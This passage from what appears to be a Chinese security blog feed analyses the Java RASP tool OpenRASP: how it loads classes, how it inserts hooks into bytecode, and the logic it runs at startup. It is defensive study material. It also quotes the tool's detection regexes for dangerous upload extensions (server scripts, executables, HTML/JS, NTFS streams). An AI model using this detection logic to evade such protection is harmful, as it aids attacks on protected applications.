class="string">&#x27;fileUpload_webdav&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clean</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.正则表达式</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 如果你配置了非常规的扩展名映射，比如让 .abc 当做PHP脚本执行，那你可能需要增加更多扩展名</span></span><br><span class="line"><span class="keyword">var</span> scriptFileRegex = <span class="regexp">/\.(aspx?|jspx?|php[345]?|phar|phtml|sh|py|pl|rb)\.?$/i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正常文件</span></span><br><span class="line"><span class="keyword">var</span> cleanFileRegex  = <span class="regexp">/\.(jpg|jpeg|png|gif|bmp|txt|rar|zip)$/i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 文件读取扩展名白名单，包含 压缩文件 office文件 图片文件</span></span><br><span class="line"><span class="keyword">var</span> readFileWhiteExt = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/\.(do[c|t][x|m|]?|xl[s|t][x|m|b]?|pp[t|s|a][x|m]?|pot[x|m]|7z|tar|gz|bz2|xz|rar|zip|jpg|jpeg|png|gif|bmp|txt|)$/</span>, <span class="string">&#x27;i&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配 HTML/JS 等可以用于钓鱼、domain-fronting 的文件</span></span><br><span class="line"><span class="keyword">var</span> htmlFileRegex   = <span class="regexp">/\.(htm|html|js)$/i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配 EXE/DLL 等可以执行的文件</span></span><br><span class="line"><span class="keyword">var</span> exeFileRegex    = <span class="regexp">/\.(exe|dll|scr|vbs|cmd|bat)$/i</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 其他的 stream 都没啥用</span></span><br><span class="line"><span class="keyword">var</span> ntfsRegex       = <span class="regexp">/::\$(DATA|INDEX)$/</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>《Java代码审计实战》</span><br><span class="line"><span class="number">2.</span>《Java代码审计-入门篇》</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP类加载</title>
      <link href="/2022/11/25/OpenRASP%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
      <url>/2022/11/25/OpenRASP%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP类加载"><a href="#OpenRASP类加载" class="headerlink" title="OpenRASP类加载"></a>OpenRASP类加载</h1><h2 id="初始化中的类加载"><a href="#初始化中的类加载" class="headerlink" title="初始化中的类加载"></a>初始化中的类加载</h2><p>​在“OpenRASP主线逻辑”中，我们知道rasp.jar的com.baidu.openrasp.Agent$init方法与类加载相关，本篇文章对此展开分析。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(String mode, String action, Instrumentation inst)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        JarFileHelper.addJarToBootstrap(inst);</span><br><span class="line">        readVersion();<span class="comment">//读取MANIFEST.MF相关信息</span></span><br><span class="line">        ModuleLoader.load(mode, action, inst);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;[OpenRASP] Failed to initialize, will continue without security protection.&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">ModuleLoader.load(mode, action, inst);   <span class="comment">//类方法</span></span><br><span class="line">-&gt; instance = <span class="keyword">new</span> <span class="title class_">ModuleLoader</span>(mode, inst);</span><br><span class="line">-&gt; engineContainer = <span class="keyword">new</span> <span class="title class_">ModuleContainer</span>(ENGINE_JAR);</span><br><span class="line">   engineContainer.start(mode, inst);</span><br></pre></td></tr></table></figure><p>1.addJarToBootstrap(inst)：将rasp.jar添加到BootStrap classpath，使得rasp.jar中的类被BootstrapClassLoader加载；</p><blockquote><p>把rasp.jar添加到BootstrapClassLoader的classpath上，当Bootstrap ClassLoader检查自身加载过的类，发现没有找到目标类时，会在指定的jar文件中搜索。</p></blockquote><blockquote><p>官方文档也做了如下解释：</p><p>当去 hook 像 <code>java.io.File</code> 这样由 <code>BootstrapClassLoader</code> 加载的类的时候，无法从该类调用非 <code>BootstrapClassLoader</code> 加载的类中的接口，所以 <code>agent.jar</code> 会先将自己添加到 <code>BootstrapClassLoader</code> 的ClassPath下，这样 hook 由 <code>BootstrapClassLoader</code> 加载的类的时候就能够成功调用到 <code>agent.jar</code> 中的检测入口</p></blockquote><p>2.ModuleLoader.load(mode, action, inst)：实现了加载rasp-engine.jar，并调用入口类EngineBoot$start，将执行流交给rasp-engine.jar。并将加载rasp-engine.jar的加载器寄存在rasp.jar的ModuleLoader.moduleClassLoader。</p><p>​在ModuleLoader的静态代码块中，通过while循环获取了扩展类加载器（sun.misc.Launcher$ExtClassLoader），将ExtClassLoader寄存在ModuleLoader.moduleClassLoader属性，以供接下来使用。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">systemClassLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line">    <span class="keyword">while</span> (systemClassLoader.getParent() != <span class="literal">null</span></span><br><span class="line">           &amp;&amp; !systemClassLoader.getClass().getName().equals(<span class="string">&quot;sun.misc.Launcher$ExtClassLoader&quot;</span>)) &#123;</span><br><span class="line">        systemClassLoader = systemClassLoader.getParent();</span><br><span class="line">    &#125;</span><br><span class="line">    moduleClassLoader = systemClassLoader;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>​ExtClassLoader是我们能获取到最高级的类加载器了，通过systemClassLoader.getParent获取父加载器时，ExtClassLoader.getParent会返回null，因为BootstrapClassLoader是C++实现不能获取。</p></blockquote><p>​容器类ModuleContainer在实例化时加载engine，参数jarName为”rasp-engine.jar”。程序先获取到jar包的全路径，根据前面解析MANIFEST.MF得到的attributes获知jar包的模块名和入口类名，接下来是分情况将rasp-engine.jar添加到classpath，并加载其入口类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ModuleContainer</span><span class="params">(String jarName)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">originFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(baseDirectory + File.separator + jarName);</span><br><span class="line">        <span class="type">JarFile</span> <span class="variable">jarFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarFile</span>(originFile);</span><br><span class="line">        <span class="type">Attributes</span> <span class="variable">attributes</span> <span class="operator">=</span> jarFile.getManifest().getMainAttributes();</span><br><span class="line">        jarFile.close();</span><br><span class="line">        <span class="built_in">this</span>.moduleName = attributes.getValue(<span class="string">&quot;Rasp-Module-Name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">moduleEnterClassName</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;Rasp-Module-Class&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (moduleName != <span class="literal">null</span> &amp;&amp; moduleEnterClassName != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; !moduleName.equals(<span class="string">&quot;&quot;</span>) &amp;&amp; !moduleEnterClassName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            Class moduleClass;</span><br><span class="line">            <span class="keyword">if</span> (ClassLoader.getSystemClassLoader() <span class="keyword">instanceof</span> URLClassLoader) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URLClassLoader&quot;</span>).getDeclaredMethod(<span class="string">&quot;addURL&quot;</span>, URL.class);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                method.invoke(moduleClassLoader, originFile.toURI().toURL());</span><br><span class="line">                method.invoke(ClassLoader.getSystemClassLoader(), originFile.toURI().toURL());</span><br><span class="line">                moduleClass = moduleClassLoader.loadClass(moduleEnterClassName);</span><br><span class="line">                <span class="keyword">module</span> = (Module) moduleClass.newInstance();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ModuleLoader.isCustomClassloader()) &#123;</span><br><span class="line">                moduleClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> moduleClassLoader.getClass().getDeclaredMethod(<span class="string">&quot;appendToClassPathForInstrumentation&quot;</span>, String.class);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    method.invoke(moduleClassLoader, originFile.getCanonicalPath());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    method.invoke(moduleClassLoader, originFile.getAbsolutePath());</span><br><span class="line">                &#125;</span><br><span class="line">                moduleClass = moduleClassLoader.loadClass(moduleEnterClassName);</span><br><span class="line">                <span class="keyword">module</span> = (Module) moduleClass.newInstance();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Exception</span>(<span class="string">&quot;[OpenRASP] Failed to initialize module jar: &quot;</span> + jarName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;[OpenRASP] Failed to initialize module jar: &quot;</span> + jarName);</span><br><span class="line">        <span class="keyword">throw</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里的情况到底是在区分什么呢？</p><p>​在jdk8中，<em>AppClassLoader extends URLClassLoader</em>，<em>ExtClassLoader extends URLClassLoader</em>。</p><p>​在jdk9中，扩展机制被移除，Java 类库就已天然地满足了可扩展的需求，那自然无须再保留 <JAVA_HOME>\lib\ext 目录，为了向后兼容被重命名为平台类加载器<em>PlatformClassLoader，AppClassLoader</em>、<em>PlatformClassLoader extends BuiltinClassLoader</em>，不再是URLClassLoader。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ClassLoader.getSystemClassLoader() <span class="keyword">instanceof</span> URLClassLoader) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//如果系统类加载器是URLClassLoader的实例，则把rasp-engine.jar路径也添加到系统类加载器和扩展类加载器上；</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ModuleLoader.isCustomClassloader()) &#123;</span><br><span class="line">    moduleClassLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">    <span class="comment">//如果系统类加载器是JDK9/11、Weblogic的类加载器，则用系统类加载器覆盖moduleClassLoader，并将rasp-enginer路径添加到moduleClassLoader类加载器上。</span></span><br><span class="line">    ...</span><br><span class="line">&#125;  </span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断是否是weblogic或者jdk9、10和11</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isCustomClassloader</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader().getClass().getName();</span><br><span class="line">        <span class="keyword">if</span> (classLoader.startsWith(<span class="string">&quot;com.oracle&quot;</span>) &amp;&amp; classLoader.contains(<span class="string">&quot;weblogic&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> isModularityJdk();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​因为加载并实例化rasp-engine.jar的入口类EngineBoot时，都是先获取ModuleLoader.moduleClassLoader属性，用该加载器完成类加载。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">moduleClass = moduleClassLoader.loadClass(moduleEnterClassName);</span><br><span class="line"><span class="keyword">module</span> = (Module) moduleClass.newInstance();</span><br></pre></td></tr></table></figure><p>​现在moduleClassLoader为ModuleLoader静态代码块获取到的ExtClassLoader，或者是jdk9中的PlatformClassLoader，分情况讨论：</p><p>​如果系统类加载器（AppClassLoader，默认类加载器）就是URLClassLoader子类实例的话，说明是JDK8，就直接用moduleClassLoader中寄存的ExtClassLoader加载；</p><p>​如果系统类加载器是Weblogic或者jdk9、11的加载器的话，就将moduleClassLoader覆盖为系统类加载器。可能是因为，后面这几个加载器提供了唯一位置，功效就能和ExtClassLoader一样。jdk9以后类加载机制有模块化参与，那么只需要moduleClassLoader设为当前系统类加载器，系统类能根据moduleClassLoader反射加载rasp-engine中的类；应用类也能通过双亲委派机制中的模块化加载到rasp-engine中的类，不会受应用隔离的影响。</p><h2 id="获取hook类信息"><a href="#获取hook类信息" class="headerlink" title="获取hook类信息"></a>获取hook类信息</h2><p>​在“OpenRASP主线逻辑”中，我们将AbstractClassHook抽象类的子类称为hook类，他们是OpenRASP实现检测逻辑的关键。</p><blockquote><p>​hook类的作用是，在类加载时，在类的指定方法中插入检测代码，在类的该方法执行时，检测代码会通过反射执行hook类的某些方法，从而对该类的传参进行检查。</p></blockquote><p>​我们在应用类OgnlParser加载时，在其topLevelExpression方法中插入检测代码，在OgnlParser类的topLevelExpression方法执行时，检测代码会通过反射执行OgnlHook类的checkOgnlExpression方法，从而对该类的属性进行检查。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">hookMethod</span><span class="params">(CtClass ctClass)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> getInvokeStaticSrc(OgnlHook.class, <span class="string">&quot;checkOgnlExpression&quot;</span>,</span><br><span class="line">                                    <span class="string">&quot;$_&quot;</span>, Object.class);</span><br><span class="line">    insertAfter(ctClass, <span class="string">&quot;topLevelExpression&quot;</span>, <span class="literal">null</span>, src);</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">node = <span class="keyword">new</span> <span class="title class_">OgnlParser</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(expression)).topLevelExpression()</span><br></pre></td></tr></table></figure><p>​插入的检测代码，是反射执行hook类的指定方法，那应用类<em>ognl&#x2F;OgnlParser</em>或者<em>java&#x2F;io&#x2F;ObjectInputStream</em>系统类，是如何获取到rasp-engine.jar中的hook类信息的呢？可以查看AbstractClassHook$getInvokeStaticSrc中生成的检测代码，如果拦截类是系统类，插入的检测代码是反射获取moduleClassLoader，加载rasp-engine.jar中的hook类；如果拦截类是应用类，就默认已经获取该hook类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// com.baidu.openrasp.hook/AbstractClassHook:</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取调用静态方法的代码字符串</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> invokeClass 静态方法所属的类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodName  静态方法名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> paramString 调用传入的参数字符串,按照javassist格式</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 整合之后的代码</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getInvokeStaticSrc</span><span class="params">(Class invokeClass, String methodName, String paramString, Class... parameterTypes)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">if</span> (isLoadedByBootstrapLoader) &#123;</span><br><span class="line">            src = <span class="string">&quot;com.baidu.openrasp.ModuleLoader.moduleClassLoader.loadClass(\&quot;&quot;</span> + invokeClassName + <span class="string">&quot;\&quot;).getMethod(\&quot;&quot;</span> + methodName +</span><br><span class="line">                <span class="string">&quot;\&quot;,&quot;</span> + parameterTypesString + <span class="string">&quot;).invoke(null&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.isEmpty(paramString)) &#123;</span><br><span class="line">                src += (<span class="string">&quot;,new Object[]&#123;&quot;</span> + paramString + <span class="string">&quot;&#125;);&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                src += <span class="string">&quot;,null);&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getCause() != null &amp;&amp; t.getCause().getClass()&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            src = invokeClassName + <span class="string">&#x27;.&#x27;</span> + methodName + <span class="string">&quot;(&quot;</span> + paramString + <span class="string">&quot;);&quot;</span>;</span><br><span class="line">            src = <span class="string">&quot;try &#123;&quot;</span> + src + <span class="string">&quot;&#125; catch (Throwable t) &#123;if(t.getClass()&quot;</span> +</span><br><span class="line">                <span class="string">&quot;.getName().equals(\&quot;com.baidu.openrasp.exceptions.SecurityException\&quot;))&#123;throw t;&#125;&#125;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> src;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h2><p>1.把rasp.jar添加到BootStrap路径，这样当某加载器加载某类时（不管是系统类还是应用类，该类被插入一段字节码后，需要加载这段字节码中的rasp类），通过双亲委派机制一直向上层委派，最终必然能通过BootStrapClassLoader加载到rasp类。</p><p>2.OpenRASP用扩展类加载器加载rasp-engine.jar，</p><p>​a.使得要监控的系统类（“java&#x2F;io&#x2F;ObjectInputStream”）加载其中插入的rasp-engine代码时，只需要先通过BootStrapClassLoader加载的rasp.jar中的com.baidu.openrasp.ModuleLoader保存的moduleClassLoader中的扩展类加载器，加载rasp-engine.jar中的hook类。</p><p>​b.使得要监控的应用类（“ognl&#x2F;OgnlParser”）加载其中插入的rasp-engine代码时，只需要在隐式加载中利用双亲委派机制向上委派，通过扩展类加载器加载rasp-engine.jar中的hook类。</p><blockquote><p>显示加载：Class.forName和classLoader.loadClass等方式加载。</p><p>隐式加载：A类是被类加载器ClassLoaderA加载的，然后A类中import了B类，并且在A类的构造方法中，调用了B类的某个field或method，那么，在A类被实例化前，JVM会默认通过类加载器ClassLoaderA去把B类也加载进JVM。</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>以OpenRASP为基础-展开来港港RASP的类加载</span><br><span class="line">https:<span class="comment">//xz.aliyun.com/t/8148</span></span><br><span class="line"><span class="number">2.</span>探秘Java9之类加载</span><br><span class="line">https:<span class="comment">//juejin.cn/post/6844903573306736654</span></span><br><span class="line"><span class="number">3.</span>OpenRASP浅析</span><br><span class="line">    https:<span class="comment">//xz.aliyun.com/t/11803</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenRASP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenRASP主线逻辑</title>
      <link href="/2022/11/25/OpenRASP%E4%B8%BB%E7%BA%BF%E9%80%BB%E8%BE%91/"/>
      <url>/2022/11/25/OpenRASP%E4%B8%BB%E7%BA%BF%E9%80%BB%E8%BE%91/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenRASP主线逻辑"><a href="#OpenRASP主线逻辑" class="headerlink" title="OpenRASP主线逻辑"></a>OpenRASP主线逻辑</h1><p>​在Java Agent文章的最后，我抱着这样的疑问：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">agent程序是在类加载时修改字节码，怎么样实现对方法调用的监控？是修改字节码时修改了目标类的方法，使得该方法被调用时能传递信息给外部程序记录，云控就是在这个位置吗？还是有方法调用相关的JVMTI事件，从而能挂上方法调用相关的回调接口？</span><br></pre></td></tr></table></figure><p>​本篇文章就来解决该疑问，归纳OpenRASP启动后的主线逻辑，为接下来深入OpenRASP类加载、字节码修改、hook函数、云控、js检测规则等细节打上锚点。</p><h2 id="rasp-jar"><a href="#rasp-jar" class="headerlink" title="rasp.jar"></a>rasp.jar</h2><p>​OpenRASP有Agent和Attach两种启动方式，入口类是com.baidu.openrasp.Agent，根据Java Agent，以Agent模式启动时会调用premain方法，以Attach模式启动时会调用agentmain方法，这两种方法都会调用Agent$init。该方法实现如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(String mode, String action, Instrumentation inst)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        JarFileHelper.addJarToBootstrap(inst);</span><br><span class="line">        readVersion();<span class="comment">//读取MANIFEST.MF相关信息</span></span><br><span class="line">        ModuleLoader.load(mode, action, inst);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;[OpenRASP] Failed to initialize, will continue without security protection.&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.addJarToBootstrap(inst)：将rasp.jar添加到BootStrap classpath，这样做目的是，被hook的系统类或是应用类都能通过双亲委派机制找到OpenRASP中的hook类；</p><p>2.ModuleLoader.load(mode, action, inst)调用栈为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ModuleLoader类的<span class="keyword">static</span>代码块获取到ExtClassLoader，并寄存在类属性moduleClassLoader</span><br><span class="line">-&gt; 调用静态方法ModuleLoader.load，其调用构造函数<span class="keyword">new</span> <span class="title class_">ModuleLoader</span>(mode, inst)；</span><br><span class="line">-&gt;  在构造函数中，先实例化容器类<span class="keyword">new</span> <span class="title class_">ModuleContainer</span>，其通过ExtClassLoader加载rasp-engine.jar，并将入口类实例赋给类变量<span class="keyword">module</span>，ModuleContainer$start方法实现是调用<span class="keyword">module</span>$start方法，从而调用EngineBoot$start。</span><br><span class="line">简言之，实现了加载rasp-engine.jar，并调用入口类EngineBoot$start，将执行流交给rasp-engine.jar。并将加载rasp-engine.jar的加载器寄存在rasp.jar的ModuleLoader.moduleClassLoader。</span><br></pre></td></tr></table></figure><p>​在我看来，OpenRASP用容器类封装对模块入口类的调用，而目前模块仅有rasp-engine.jar，为啥不直接耦合嘞。有关添加到BootStrap classpath、使用ExtClassLoader的原因，将在“OpenRASP类加载”进一步说明。接下来主线逻辑交给EngineBoot$start。</p><h2 id="rasp-engine-jar"><a href="#rasp-engine-jar" class="headerlink" title="rasp-engine.jar"></a>rasp-engine.jar</h2><p>​完成加载rasp-engine.jar后，可以知道OpenRASP中日志、插件、云控、V8、字节码修改逻辑都在rasp-engine.jar，而rasp.jar只是Java Agent的实现，以及做了模块化封装。com.baidu.openrasp.EngineBoot$start方法实现如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(String mode, Instrumentation inst)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;\n\n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;   ____                   ____  ___   _____ ____ \n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;  / __ \\____  ___  ____  / __ \\/   | / ___// __ \\\n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot; / / / / __ \\/ _ \\/ __ \\/ /_/ / /| | \\__ \\/ /_/ /\n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;/ /_/ / /_/ /  __/ / / / _, _/ ___ |___/ / ____/ \n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;\\____/ .___/\\___/_/ /_/_/ |_/_/  |_/____/_/      \n&quot;</span> +</span><br><span class="line">                       <span class="string">&quot;    /_/                                          \n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//V8初始化</span></span><br><span class="line">        Loader.load();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[OpenRASP] Failed to load native library, please refer to https://rasp.baidu.com/doc/install/software.html#faq-v8-load for possible solutions.&quot;</span>);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//日志配置初始化</span></span><br><span class="line">    <span class="keyword">if</span> (!loadConfig()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//缓存rasp的build信息</span></span><br><span class="line">    Agent.readVersion();</span><br><span class="line">    BuildRASPModel.initRaspInfo(Agent.projectVersion, Agent.buildTime, Agent.gitCommit);</span><br><span class="line">    <span class="comment">// 插件系统初始化</span></span><br><span class="line">    <span class="keyword">if</span> (!JS.Initialize()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//hook点管理初始化</span></span><br><span class="line">    CheckerManager.init();</span><br><span class="line">    <span class="comment">//字节码转换器初始化</span></span><br><span class="line">    initTransformer(inst);</span><br><span class="line">    <span class="keyword">if</span> (CloudUtils.checkCloudControlEnter()) &#123;</span><br><span class="line">        CrashReporter.install(Config.getConfig().getCloudAddress() + <span class="string">&quot;/v1/agent/crash/report&quot;</span>,</span><br><span class="line">                              Config.getConfig().getCloudAppId(), Config.getConfig().getCloudAppSecret(),</span><br><span class="line">                              CloudCacheModel.getInstance().getRaspId());</span><br><span class="line">    &#125;</span><br><span class="line">    deleteTmpDir();</span><br><span class="line">    <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;[OpenRASP] Engine Initialized [&quot;</span> + Agent.projectVersion + <span class="string">&quot; (build: GitCommit=&quot;</span></span><br><span class="line">        + Agent.gitCommit + <span class="string">&quot; date=&quot;</span> + Agent.buildTime + <span class="string">&quot;)]&quot;</span>;</span><br><span class="line">    System.out.println(message);</span><br><span class="line">    Logger.getLogger(EngineBoot.class.getName()).info(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​在EngineBoot$start中依次完成V8引擎、配置（包括日志、云控、syslog服务配置）、插件系统、hook点管理以及字节码转换器的初始化，接下来分析CheckerManager$init和initTransformer(inst)，理清OpenRASP怎样实现对方法调用的监控。</p><p>​CheckerManager类用于管理hook点，代码中Type为CheckParameter内部枚举类，定义了不同攻击类型对应的检测器（分为V8、Java本地以及基线检测器3类）。CheckerManager$init执行时，就是遍历checkerCheckParameter的Type，将其中元素添加进枚举映射checkers中，CheckerManager.checkers是静态变量，供接下来直接使用。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /plugin/checker/CheckerManager.java：</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> EnumMap&lt;Type, Checker&gt; checkers = <span class="keyword">new</span> <span class="title class_">EnumMap</span>&lt;Type, Checker&gt;(Type.class);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">for</span> (Type type : Type.values()) &#123;</span><br><span class="line">        checkers.put(type, type.checker);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"><span class="comment">// /plugin/checker/CheckParameter.java：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Type</span> &#123;</span><br><span class="line">        <span class="comment">// js插件检测</span></span><br><span class="line">        SQL(<span class="string">&quot;sql&quot;</span>, <span class="keyword">new</span> <span class="title class_">V8AttackChecker</span>(), <span class="number">1</span>),</span><br><span class="line">    <span class="comment">// java本地检测</span></span><br><span class="line">    SQL_SLOW_QUERY(<span class="string">&quot;sqlSlowQuery&quot;</span>, <span 